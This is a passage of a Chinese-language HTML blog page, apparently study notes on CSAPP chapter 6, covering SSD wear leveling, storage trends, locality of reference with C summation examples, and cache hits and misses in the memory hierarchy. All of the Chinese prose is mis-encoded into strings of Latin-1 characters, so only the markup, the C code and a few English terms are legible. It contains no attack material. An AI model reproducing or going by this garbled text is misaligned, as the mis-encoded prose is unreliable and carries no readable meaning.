ä¸ªå¿«çš„åºåˆ—ç»„æˆï¼Œæ¯ä¸ªå—ç”± P é¡µç»„æˆï¼Œè€Œ<strong>æ•°æ®æ˜¯ä»¥é¡µçš„å•ä½æ¥è¯»å†™çš„</strong>ã€‚åªæœ‰åœ¨ä¸€é¡µæ‰€å±çš„å—æ•´ä¸ªè¢«æ“¦é™¤ä¹‹åï¼Œæ‰èƒ½å†™è¿™ä¸€é¡µï¼ˆé€šå¸¸æ˜¯æŒ‡è¯¥å—ä¸­çš„æ‰€æœ‰ä½éƒ½è¢«è®¾ç½®ä¸º1ï¼‰ã€‚ä¸è¿‡ï¼Œä¸€æ—¦ä¸€ä¸ªå—è¢«æ“¦é™¤äº†ï¼Œå—ä¸­æ¯ä¸€ä¸ªé¡µéƒ½å¯ä»¥ä¸éœ€è¦å†è¿›è¡Œæ“¦é™¤å°±å†™ä¸€æ¬¡ã€‚åœ¨å¤§çº¦è¿›è¡Œ100000æ¬¡é‡å¤å†™ä¹‹åï¼Œå—å°±ä¼šç£¨æŸåã€‚åªè¦æœ‰ä¸€ä¸ªå—ç£¨æŸåï¼Œè¿™ä¸ªç¡¬ç›˜å°±ä¸èƒ½å†ä½¿ç”¨äº†ã€‚</p><p>å›ºæ€ç¡¬ç›˜èƒ½è€—ä½ï¼Œé€Ÿåº¦å¿«ï¼Œä½†æ˜¯åå¤å†™ä¹‹åä¼šç£¨æŸã€‚é—ªå­˜ç¿»è¯‘å±‚ä¸­çš„<strong>å¹³å‡ç£¨æŸé€»è¾‘</strong>è¯•å›¾é€šè¿‡å°†æ›¹å¤„å¹³å‡åˆ†é…åœ¨æ‰€æœ‰çš„å—ä¸Šæ¥æœ€å¤§åŒ–æ¯ä¸ªå—çš„å¯¿å‘½ã€‚åŒæ ·ï¼Œé«˜æ€§èƒ½å¸¦æ¥çš„å¿…å®šæ˜¯æ˜‚è´µçš„ä»·æ ¼ï¼Œä¸è¿‡å› ä¸º SSD è¶Šæ¥è¶Šå—æ¬¢è¿ï¼Œå®ƒä»¬ä¹‹é—´çš„ä»·æ ¼å·®è·ä¹Ÿåœ¨é€æ­¥å‡å°‘ã€‚</p><h4 id="å­˜å‚¨æŠ€æœ¯è¶‹åŠ¿"><a href="#å­˜å‚¨æŠ€æœ¯è¶‹åŠ¿" class="headerlink" title="å­˜å‚¨æŠ€æœ¯è¶‹åŠ¿"></a>å­˜å‚¨æŠ€æœ¯è¶‹åŠ¿</h4><p>æˆ‘ä»¬å¯¹å­˜å‚¨æŠ€æœ¯çš„ç ”ç©¶ï¼Œæœ‰ä»¥ä¸‹å‡ ç‚¹é‡è¦çš„æ€æƒ³ï¼š</p><ul><li><p>ä¸åŒçš„å¤„å¤„æŠ€æœ¯æœ‰ä¸åŒçš„ä»·æ ¼å’Œæ€§èƒ½æŠ˜ä¸­ã€‚</p><p>åœ¨å­˜å‚¨é€Ÿåº¦æ–¹é¢ï¼ŒSRAM &gt; DRAM &gt; SSD &gt; æ—‹è½¬ç£ç›˜ï¼ŒåŒæ ·æ€§èƒ½é«˜çš„ç¡¬ä»¶è®¾å¤‡çš„é€ å‡ä¹Ÿæ›´é«˜</p></li><li><p>ä¸åŒå­˜å‚¨æŠ€æœ¯çš„ä»·æ ¼å’Œæ€§èƒ½å±æ€§å˜åŒ–çš„é€Ÿç‡ä¸åŒ</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E6%80%A7%E8%83%BD%E5%8F%98%E5%8C%96.png"></p></li></ul><h1 id="å±€éƒ¨æ€§"><a href="#å±€éƒ¨æ€§" class="headerlink" title="å±€éƒ¨æ€§"></a>å±€éƒ¨æ€§</h1><p>è®¡ç®—æœºç¨‹åºé€šå¸¸æ˜¯å…·æœ‰å±€éƒ¨æ€§çš„ï¼Œå®ƒä»¬ä¼šå€¾å‘äºå¼•ç”¨è‡ªå·±é™„è¿‘çš„å†…å­˜åŒºåŸŸæˆ–è€…æ˜¯è‡ªå·±æœ¬èº«ï¼Œæ¯”å¦‚ä¸€ä¸ªå¾ªç¯ç¨‹åºï¼Œå®ƒå°±ä¼šåå¤æ‰§è¡Œä¸€ä¸ªå±€éƒ¨çš„ä»£ç æˆ–è€…æ˜¯å±€éƒ¨çš„ä¸€ä¸ªå˜é‡ï¼Œè¿™ç§å€¾å‘æ€§è¢«ç§°ä¸º<strong>å±€éƒ¨æ€§åŸç†</strong>ã€‚</p><ul><li>æ—¶é—´å±€éƒ¨æ€§ï¼šè¢«å¼•ç”¨è¿‡çš„å†…å­˜ä½ç½®å¾ˆæœ‰å¯èƒ½å†è¢«å¤šæ¬¡å¼•ç”¨</li><li>ç©ºé—´å±€éƒ¨æ€§ï¼šå¦‚æœä¸€ä¸ªå†…å­˜è¢«å¼•ç”¨è¿‡ä¸€æ¬¡ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½å¼•ç”¨é™„è¿‘çš„ä¸€ä¸ªå†…å­˜ä½ç½®</li></ul><blockquote><p>åªè¦ç›®æ ‡å‡½æ•°æ»¡è¶³å…¶ä¸€ï¼Œæˆ‘ä»¬å°±ç§°è¿™ä¸ªå‡½æ•° â€ æœ‰è‰¯å¥½çš„å±€éƒ¨æ€§ â€œ </p></blockquote><h3 id="å¯¹æ•°æ®å¼•ç”¨çš„å±€éƒ¨"><a href="#å¯¹æ•°æ®å¼•ç”¨çš„å±€éƒ¨" class="headerlink" title="å¯¹æ•°æ®å¼•ç”¨çš„å±€éƒ¨"></a>å¯¹æ•°æ®å¼•ç”¨çš„å±€éƒ¨</h3><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼Œä¸‹é¢çš„å‡½æ•°å¯¹å‘é‡çš„å…ƒç´ æ±‚å’Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sumvec</span><span class="hljs-params">(<span class="hljs-type">int</span> v[N])</span><br>&#123;<br>    <span class="hljs-type">int</span> i,sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;N;i++)<br>    &#123;<br>        sum+=v[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;   <br>&#125;<br></code></pre></td></tr></table></figure><p>N&#x3D;8 æ—¶ï¼Œå¼•ç”¨æ¨¡å¼å…¥ä¸‹ï¼š</p><table><thead><tr><th>åœ°å€</th><th>0</th><th>4</th><th>8</th><th>12</th><th>16</th><th>20</th><th>24</th><th>28</th></tr></thead><tbody><tr><td>å†…å®¹</td><td>$$v_0$$</td><td>$$v_1$$</td><td>$$v_2$$</td><td>$$v_3$$</td><td>$$v_4$$</td><td>$$v_5$$</td><td>$$v_6$$</td><td>$$v_7$$</td></tr><tr><td>è®¿é—®é¡ºåº</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td></tr></tbody></table><p>è¿™ä¸ªå‡½æ•°çš„å…ƒç´ æ˜¯è¢«æŒ‰ç…§ä»–ä»¬åœ¨å†…å­˜ä¸­çš„é¡ºåºæ¥è¯»å–çš„ï¼Œæ‰€ä»¥å¯¹äºå˜é‡vï¼Œè¿™ä¸ªå‡½æ•°æœ‰å¾ˆå¥½çš„ç©ºé—´å±€éƒ¨æ€§ã€‚</p><p>åƒ sumvec å‡½æ•°è¿™æ ·é¡ºåºè®¿é—®æ¯ä¸€ä¸ªå…ƒç´ çš„å‡½æ•°ï¼Œå…·æœ‰æ­¥é•¿ä¸º1çš„å¼•ç”¨æ¨¡å¼ï¼Œæˆ‘ä»¬ç§°è¿™æ ·çš„å¼•ç”¨æ¨¡å¼ä¸º<strong>é¡ºåºå¼•ç”¨æ¨¡å¼</strong>ã€‚ä¸€ä¸ªè¿ç»­å‘é‡ä¸­ï¼Œæ¯éš” k ä¸ªå…ƒç´ è¿›è¡Œè®¿é—®ï¼Œå°±ç§°ä¸ºæ­¥é•¿ä¸º k çš„å¼•ç”¨æ¨¡å¼ã€‚æ­¥é•¿ä¸º 1 çš„å¼•ç”¨æ¨¡å¼æ˜¯ç¨‹åºä¸­ç©ºé—´å±€éƒ¨æ€§å¸¸è§å’Œé‡è¦çš„æ¥æºã€‚ä¸€èˆ¬è€Œè¨€ï¼Œ<strong>éšç€æ­¥é•¿çš„å¢åŠ ï¼Œç©ºé—´å±€éƒ¨æ€§ä¸‹é™</strong>ã€‚</p><p>æ¥ä¸‹æ¥ä¸¤ä¸ªä¾‹å­åˆ†åˆ«å±•ç¤ºäº†å±€éƒ¨æ€§å¾ˆå¥½å’Œå¾ˆå·®çš„ä¸¤ä¸ªç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">(<span class="hljs-type">int</span> a[M][N])</span><br>&#123;<br>    <span class="hljs-type">int</span> i,j,sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;M;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;N;j++)<br>        &#123;<br>            sum+=a[i][j];<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum2</span><span class="hljs-params">(<span class="hljs-type">int</span> a[M][N])</span><br>&#123;<br>    <span class="hljs-type">int</span> i,j,sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;N;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;M;j++)<br>        &#123;<br>            sum+=a[j][i];<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç©ºé—´å±€éƒ¨æ€§ä½“ç°åœ¨è®¿é—® <code>a[i]</code> æ•°ç»„ä¸Šï¼Œå› ä¸ºä¸‹ä¸€æ¬¡å¾ªç¯å°±ä¼šè®¿é—®ä¸Šä¸€æ¬¡è®¿é—®è¿‡çš„å…ƒç´ çš„åé¢ä¸€ä¸ªä½ç½®ã€‚</p><p>æ—¶é—´å±€éƒ¨æ€§å°±ä½“ç°åœ¨è®¿é—® <code>sum</code> å˜é‡ä¸Šï¼Œå› ä¸ºæ¯æ¬¡éƒ½ä¼šå–å¾— <code>sum</code> å˜é‡å»è¿›è¡Œè¿ç®—ã€‚</p><p>sum1 çš„å±€éƒ¨æ€§å°±æ¯” sum2 è¦å¥½å¾—å¤šã€‚sum1æ¯æ¬¡å¾ªç¯ä¼šåˆ¶é€ æ­¥é•¿ä¸º 1 çš„ç©ºé—´ç§»åŠ¨ï¼Œè€Œ sum2 æ¯æ¬¡å¾ªç¯ä¼šåˆ¶é€ é—´éš”ä¸º N çš„ç©ºé—´ç§»åŠ¨</p><blockquote><p>åœ¨ <code>a[M][N]</code> ä¸­ï¼Œ <code>a[i][j]~a[i][j+1]</code> åœ°å€ç´§é‚»ï¼Œè€Œ <code>a[i][j]</code> å’Œ <code>a[i+1][j]</code> ç›¸å·®äº† N ä¸ª int çš„æ•°æ®ï¼‰ã€‚</p></blockquote><h3 id="å–æŒ‡çš„å±€éƒ¨æ€§"><a href="#å–æŒ‡çš„å±€éƒ¨æ€§" class="headerlink" title="å–æŒ‡çš„å±€éƒ¨æ€§"></a>å–æŒ‡çš„å±€éƒ¨æ€§</h3><ul><li><p>ç©ºé—´å±€éƒ¨æ€§ä½“ç°åœ¨å¾ªç¯å†…éƒ¨ï¼Œæ‰€æœ‰æŒ‡ä»¤éƒ½æ˜¯ç´§æŒ¨ç€è¿è¡Œçš„ã€‚</p></li><li><p>æ—¶é—´å±€éƒ¨æ€§ä½“ç°åœ¨å¾ªç¯å†…éƒ¨ï¼Œä¸€æ¡æŒ‡ä»¤ä¼šåœ¨å°†æ¥è¢«æ‰§è¡Œå¤šæ¬¡ã€‚</p></li></ul><h3 id="å±€éƒ¨æ€§å°ç»“"><a href="#å±€éƒ¨æ€§å°ç»“" class="headerlink" title="å±€éƒ¨æ€§å°ç»“"></a>å±€éƒ¨æ€§å°ç»“</h3><ul><li><p>å¤å¼•ç”¨ç›¸åŒå˜é‡çš„ç¨‹åºæœ‰è‰¯å¥½çš„æ—¶é—´å±€éƒ¨æ€§ã€‚</p></li><li><p>å¯¹äºå…·æœ‰æ­¥é•¿ä¸º k çš„å¼•ç”¨æ¨¡å¼çš„ç¨‹åºï¼Œæ­¥é•¿è¶Šå°ï¼Œç©ºé—´å±€éƒ¨æ€§è¶Šå¥½ã€‚</p><p>å…·æœ‰æ­¥é•¿ä¸º1çš„å¼•ç”¨æ¨¡å¼çš„ç¨‹åºæœ‰å¾ˆå¥½çš„ç©ºé—´å±€éƒ¨æ€§ã€‚åœ¨å†…å­˜ä¸­ä»¥å¤§æ­¥é•¿è·³æ¥è·³å»çš„ç¨‹åºç©ºé—´å±€éƒ¨æ€§ä¼šå¾ˆå·®ã€‚</p></li><li><p>å¯¹äºå–æŒ‡ä»¤æ¥è¯´ï¼Œå¾ªç¯æœ‰å¥½çš„æ—¶é—´å’Œç©ºé—´å±€éƒ¨æ€§ã€‚å¾ªç¯ä½“è¶Šå°ï¼Œå¾ªç¯è¿­ä»£æ¬¡æ•°è¶Šå¤šï¼Œå±€éƒ¨æ€§è¶Šå¥½ã€‚</p></li></ul><h1 id="å­˜å‚¨å™¨ç»“æ„å±‚æ¬¡"><a href="#å­˜å‚¨å™¨ç»“æ„å±‚æ¬¡" class="headerlink" title="å­˜å‚¨å™¨ç»“æ„å±‚æ¬¡"></a>å­˜å‚¨å™¨ç»“æ„å±‚æ¬¡</h1><p>æˆ‘ä»¬å†å‰ä¸¤èŠ‚äº†è§£åˆ°å­˜å‚¨æŠ€æœ¯å’Œè®¡ç®—æœºè½¯ä»¶çš„å±æ€§ï¼š</p><ul><li>å­˜å‚¨æŠ€æœ¯ï¼šä¸åŒå­˜å‚¨æŠ€æœ¯çš„è®¿é—®æ—¶é—´å·®å¼‚å¾ˆå¤§ï¼Œè¶Šé è¿‘ CPU å®¹é‡è¶Šå°ã€é€Ÿåº¦è¶Šå¿«ã€é€ ä»·ä¹Ÿæ›´é«˜</li><li>è®¡ç®—æœºè½¯ä»¶ï¼šæˆ‘ä»¬çš„ç¨‹åºéœ€è¦æœ‰è‰¯å¥½çš„å±€éƒ¨æ€§</li></ul><p>è€Œç¡¬ä»¶å’Œè½¯ä»¶ä¹‹é—´çš„åŸºæœ¬å±æ€§äº’ç›¸è¡¥å……çš„å¾ˆå®Œç¾ï¼Œæˆ‘ä»¬ç°ä»£è®¡ç®—æœºç³»ç»Ÿä¸­ä½¿ç”¨äº†ä¸€ç§ç»„ç»‡å­˜å‚¨å™¨ç³»ç»Ÿçš„æ–¹æ³•â€”â€”å­˜å‚¨å™¨ä½“ç³»ç»“æ„ã€‚å…·ä½“å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%AD%98%E5%82%A8%E5%99%A8%E7%BB%93%E6%9E%84%E5%B1%82%E6%AC%A1.png"></p><h3 id="å­˜å‚¨å™¨ä½“ç³»ç»“æ„ä¸­çš„ç¼“å­˜"><a href="#å­˜å‚¨å™¨ä½“ç³»ç»“æ„ä¸­çš„ç¼“å­˜" class="headerlink" title="å­˜å‚¨å™¨ä½“ç³»ç»“æ„ä¸­çš„ç¼“å­˜"></a>å­˜å‚¨å™¨ä½“ç³»ç»“æ„ä¸­çš„ç¼“å­˜</h3><p><strong>é«˜é€Ÿç¼“å­˜</strong>æ˜¯ä¸€ä¸ªå°è€Œå¿«é€Ÿçš„å­˜å‚¨è®¾å¤‡ï¼Œå®ƒä½œä¸ºå­˜å‚¨åœ¨æ›´å¤§ã€ä¹Ÿæ›´æ…¢çš„è®¾å¤‡ä¸­çš„æ•°æ®å¯¹è±¡çš„ç¼“å†²åŒºåŸŸã€‚ä½¿ç”¨é«˜é€Ÿç¼“å­˜çš„è¿‡ç¨‹ç§°ä¸º<strong>ç¼“å­˜</strong>ã€‚</p><p>å­˜å‚¨å™¨ä½“ç³»ç»“æ„çš„ä¸­å¿ƒæ€æƒ³æ˜¯ï¼Œå¯¹äºæ¯ä¸ª k ï¼Œä½äº k å±‚çš„æ›´å¿«æ›´å°çš„å­˜å‚¨è®¾å¤‡ä½œä¸ºä½äº k+1 å±‚çš„æ›´å¤§æ›´æ…¢çš„å­˜å‚¨è®¾å¤‡çš„ç¼“å­˜ã€‚ä¾‹å¦‚ï¼Œæœ¬åœ°ç£ç›˜ä½œä¸ºé€šè¿‡ç½‘ç»œä»è¿œç¨‹ç£ç›˜å–å‡ºçš„æ–‡ä»¶ï¼ˆä¾‹å¦‚Webé¡µé¢ï¼‰çš„ç¼“å­˜ï¼Œä¸»å­˜ä½œä¸ºæœ¬åœ°ç£ç›˜ä¸Šæ•°æ®çš„ç¼“å­˜ï¼Œä¾æ­¤ç±»æ¨ï¼Œç›´åˆ°æœ€å°çš„ç¼“å­˜â€”â€” CPU å¯„å­˜å™¨ç»„ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%BC%93%E5%AD%98%E5%8E%9F%E7%90%86.png"></p><p>å¦‚ä¸Šå›¾ï¼Œæ•°æ®æ€»æ˜¯ä»¥å—å¤§å°ä¸ºä¼ é€å•å…ƒï¼ˆtransfer unitï¼‰åœ¨ç¬¬ k å±‚å’Œç¬¬ k+1 å±‚ä¹‹é—´æ¥å›å¤åˆ¶çš„ã€‚</p><p>è™½ç„¶åœ¨å±‚æ¬¡ç»“æ„ä¸­ä»»ä½•ä¸€å¯¹ç›¸é‚»çš„å±‚æ¬¡ä¹‹é—´å—å¤§å°æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯å…¶ä»–çš„å±‚æ¬¡å¯¹ä¹‹é—´å¯ä»¥æœ‰ä¸åŒçš„å—å¤§å°ï¼Œæ¯”å¦‚ CPU å’Œ Cache ä¹‹é—´å¯èƒ½åªæœ‰åå‡ ä¸ªå­—èŠ‚çš„å¤§å°ï¼Œè€Œä¸»å­˜åˆ°ç¡¬ç›˜ä¹‹é—´å¯èƒ½æœ‰å‡ å…†ç”šè‡³å‡ åå…†çš„å¤§å°ã€‚</p><h4 id="ç¼“å­˜å‘½ä¸­"><a href="#ç¼“å­˜å‘½ä¸­" class="headerlink" title="ç¼“å­˜å‘½ä¸­"></a>ç¼“å­˜å‘½ä¸­</h4><p>å½“ç¨‹åºåˆšå¥½éœ€è¦ç¬¬ k+1 å±‚çš„æŸä¸ªç¼“å­˜æ•°æ®å¯¹è±¡ d æ—¶ï¼Œä»–é¦–å…ˆä¼šåœ¨å½“å‰å­˜å‚¨çš„ç¬¬ k å±‚çš„ç¬¬ä¸€ä¸ªå—ä¸­å¯»æ‰¾ï¼Œå€˜è‹¥ d åˆšå¥½åœ¨ k å±‚ä¸­ï¼Œé‚£ä¹ˆå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„<strong>ç¼“å­˜å‘½ä¸­</strong>ã€‚</p><h4 id="ç¼“å­˜ä¸å‘½ä¸­"><a href="#ç¼“å­˜ä¸å‘½ä¸­" class="headerlink" title="ç¼“å­˜ä¸å‘½ä¸­"></a>ç¼“å­˜ä¸å‘½ä¸­</h4><p>å¦‚æœç¬¬ k å±‚æ²¡æœ‰æˆ‘ä»¬æƒ³è¦æ‰¾çš„ç¼“å­˜æ•°æ®å¯¹è±¡ d ï¼Œå°±å«åš<strong>ç¼“å­˜ä¸å‘½ä¸­</strong>ã€‚å½“å‘ç”Ÿç¼“å­˜ä¸å‘½ä¸­æ—¶ï¼Œç¬¬ k å±‚çš„ç¼“å­˜ä»ç¬¬ k+1 å±‚ç¼“å­˜ä¸­å–å‡ºåŒ…å« d çš„é‚£ä¸ªå—ï¼Œå¦‚æœç¬¬ k å±‚çš„ç¼“å­˜å·²ç»æ»¡äº†ï¼Œå¯èƒ½å°±ä¼šè¦†ç›–ç°å­˜çš„ä¸€ä¸ªå—ã€‚</p><p>è¦†ç›–ç°å­˜å—çš„è¿‡ç¨‹ç§°ä¸º<strong>æ›¿æ¢</strong>æˆ–è€…<strong>é©±é€</strong>è¿™ä¸ªå—ï¼Œè¢«é©±é€çš„å—å«åšç‰ºç‰²å—ã€‚è€Œå†³å®šæ›¿æ¢å“ªä¸ªå—æ˜¯ç”±ç¼“å­˜çš„<strong>æ›¿æ¢ç­–ç•¥</strong>æ¥æ§åˆ¶çš„ã€‚</p><h4 id="ç¼“å­˜ä¸å‘½ä¸­çš„ç§ç±»"><a href="#ç¼“å­˜ä¸å‘½ä¸­çš„ç§ç±»" class="headerlink" title="ç¼“å­˜ä¸å‘½ä¸­çš„ç§ç±»"></a>ç¼“å­˜ä¸å‘½ä¸­çš„ç§ç±»</h4><h5 id="å¼ºåˆ¶ä¸å‘½ä¸­"><a href="#å¼ºåˆ¶ä¸å‘½ä¸­" class="headerlink" title="å¼ºåˆ¶ä¸å‘½ä¸­"></a>å¼ºåˆ¶ä¸å‘½ä¸­</h5><p>æœ‰ä¸€ç§å‘½ä¸­ç§°ä¸º<strong>å¼ºåˆ¶ä¸å‘½ä¸­</strong>æˆ–<strong>å†·ä¸å‘½ä¸­</strong>ï¼ˆcold missï¼‰ï¼Œæ˜¯æŒ‡å½“ç¬¬ k å±‚çš„ç¼“å­˜ä¸ºç©ºæ—¶ï¼Œæ­¤æ—¶æ— è®ºè®¿é—®ä»€ä¹ˆæ•°æ®éƒ½ä¼šå‘ç”Ÿä¸å‘½ä¸­ã€‚</p><p>åªè¦å‘ç”Ÿäº†ä¸å‘½ä¸­ï¼Œç¬¬ k å±‚çš„ç¼“å­˜å°±éœ€è¦æ‰§è¡ŒæŸä¸ªæ”¾ç½®ç­–ç•¥ï¼Œæœ€çµæ´»çš„æ›¿æ¢ç­–ç•¥æ˜¯æˆ‘ä»¬å…è®¸ k+1 å±‚ä¸­çš„å—æ”¾åœ¨<strong>ä»»ä½•ä¸€ä¸ªä½ç½®</strong>ï¼Œå› ä¸ºéšæœºçš„æ”¾ç½®å—ï¼Œéœ€è¦ç”¨åˆ°çš„æ—¶å€™éœ€è¦éå†æ•´ä¸ª k å±‚å­˜å‚¨å™¨ï¼Œä»£ä»·å¾ˆé«˜ã€‚</p><p>å› æ­¤ï¼Œç¡¬ä»¶ç¼“å­˜é€šå¸¸æ˜¯é‡‡ç”¨æ›´åŠ ä¸¥æ ¼çš„æ”¾ç½®ç­–ç•¥ï¼Œå°†ç¬¬ k+1 å±‚çš„æŸä¸ªå¿«é™åˆ¶æ”¾ç½®åœ¨ç¬¬ k å±‚å—çš„ä¸€ä¸ªå°å°çš„å­é›†ä¸­ã€‚ä¾‹å¦‚ï¼Œä¸Šå›¾ä¸­ï¼Œå› ä¸º k+1 å±‚çš„ç¬¬ i å—åªä¼šæ”¾åˆ° k å±‚ä¸­<strong>ç¬¬ i mod 4 å—</strong>çš„ä½ç½®ä¸Šã€‚æˆ‘ä»¬åœ¨å¯»æ‰¾çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç”¨å¾ˆä½çš„å¤æ‚åº¦å¿«é€Ÿåˆ¤æ–­æˆ‘ä»¬çš„å—åœ¨ä¸åœ¨ç¬¬ k å±‚äº†ã€‚</p><h5 id="å†²çªä¸å‘½ä¸­"><a href="#å†²çªä¸å‘½ä¸­" class="headerlink" title="å†²çªä¸å‘½ä¸­"></a>å†²çªä¸å‘½ä¸­</h5><p>ä¸Šé¢æåˆ°çš„é™åˆ¶æ€§çš„æ”¾ç½®ç­–ç•¥ä¼šå¼•èµ·å¦ä¸€ç§ä¸å‘½ä¸­å«<strong>å†²çªä¸å‘½ä¸­</strong>ï¼ˆconflict missï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸­ï¼Œç¼“å­˜è¶³å¤Ÿå¤§ï¼Œèƒ½å¤Ÿä¿å­˜è¢«å¼•ç”¨çš„æ•°æ®å¯¹è±¡ï¼Œä½†æ˜¯å› ä¸ºè¿™äº›å¯¹è±¡ä¼šæ˜ å°„åˆ°åŒä¸€ä¸ªç¼“å­˜å—ï¼Œç¼“å­˜ä¼šä¸€ç›´ä¸å‘½ä¸­ã€‚æ¯”å¦‚ï¼Œå¦‚æœç¨‹åºè¯·æ±‚å— 0ï¼Œç„¶åå— 8ï¼Œç„¶åå— 0ï¼Œç„¶åå— 8ï¼Œä¾æ­¤ç±»æ¨ï¼Œåœ¨ç¬¬ k å±‚çš„ç¼“å­˜ä¸­ï¼Œå¯¹è¿™ä¸¤ä¸ªå—çš„æ¯æ¬¡å¼•ç”¨éƒ½ä¼šä¸å‘½ä¸­ï¼Œç„¶è€Œ k å±‚çš„ç¼“å­˜è¿˜æœ‰å¾ˆå¤šç©ºé—´å¯ä»¥ä½¿ç”¨ã€‚</p><h5 id="æ•°é‡ä¸å‘½ä¸­"><a href="#æ•°é‡ä¸å‘½ä¸­" class="headerlink" title="æ•°é‡ä¸å‘½ä¸­"></a>æ•°é‡ä¸å‘½ä¸­</h5><p>å¦‚æœå¾ªç¯ä½“è¿‡å¤§ï¼Œæˆ–è€…æ˜¯æ•°ç»„éå†è¿‡å¤§ï¼Œæˆ‘ä»¬ä¹Ÿæœ‰æ¦‚ç‡å‘ç”Ÿä¸å‘½ä¸­ï¼Œå› ä¸ºè¿™ä¸ªå¤§å°å·²ç»è¿œè¿œè¶…è¿‡ç¼“å­˜èƒ½å®¹çº³çš„å¤§å°ï¼Œæ­¤æ—¶ç¼“å­˜ä¼šç»å†<strong>å®¹é‡ä¸å‘½ä¸­</strong>ï¼ˆcapacity missï¼‰ï¼Œå°±æ˜¯è¯´ç¼“å­˜å¤ªå°äº†ï¼Œå®¹çº³ä¸ä¸‹ã€‚</p><h4 id="ç¼“å­˜ç®¡ç†"><a href="#ç¼“å­˜ç®¡ç†" class="headerlink" title="ç¼“å­˜ç®¡ç†"></a>ç¼“å­˜ç®¡ç†</h4><p>ç®¡ç†ç¼“å­˜çš„é€»è¾‘å¯ä»¥æ˜¯ç¡¬ä»¶ã€è½¯ä»¶æˆ–è€…æ—¶ä¸¤è€…çš„ç»“åˆï¼š</p><ul><li>ç¼–è¯‘å™¨ç®¡ç†<strong>å¯„å­˜å™¨æ–‡ä»¶</strong>æ˜¯ç¼“å­˜å±‚æ¬¡ç»“æ„çš„æœ€é«˜å±‚ã€‚å®ƒå†³å®šå½“å‘ç”Ÿä¸å‘½ä¸­æ—¶ä½•æ—¶å‘å°„åŠ è½½ï¼Œä»¥åŠç¡®å®šå“ªä¸ªå¯„å­˜å™¨æ¥å­˜æ”¾æ•°æ®ã€‚</li><li>L1ã€L2å’Œ L3 å±‚çš„ç¼“å­˜å®Œå…¨æ˜¯ç”±<strong>å†…ç½®åœ¨ç¼“å­˜ä¸­çš„ç¡¬ä»¶é€»è¾‘</strong>æ¥ç®¡ç†çš„ã€‚</li><li>åœ¨ä¸€ä¸ªæœ‰è™šæ‹Ÿå†…å­˜çš„ç³»ç»Ÿä¸­ï¼ŒDRAM ä¸»å­˜ä½œä¸ºå­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„æ•°æ®å—çš„ç¼“å­˜ï¼Œæ˜¯ç”±<strong>æ“ä½œç³»ç»Ÿè½¯ä»¶</strong>å’Œ CPU ä¸Šçš„åœ°å€ç¿»è¯‘ç¡¬ä»¶å…±åŒç®¡ç†çš„ã€‚</li><li>å¯¹äºä¸€ä¸ªå…·æœ‰åƒ AFS è¿™æ ·çš„åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿçš„æœºå™¨æ¥è¯´ï¼Œæœ¬åœ°ç£ç›˜ä½œä¸ºç¼“å­˜ï¼Œå®ƒæ˜¯ç”±è¿è¡Œåœ¨æœ¬åœ°æœºå™¨ä¸Šçš„ <strong>AFSå®¢æˆ·ç«¯è¿›ç¨‹</strong>ç®¡ç†çš„ã€‚</li></ul><h3 id="å­˜å‚¨å™¨ä½“ç³»ç»“æ„æ¦‚å¿µå°èŠ‚"><a href="#å­˜å‚¨å™¨ä½“ç³»ç»“æ„æ¦‚å¿µå°èŠ‚" class="headerlink" 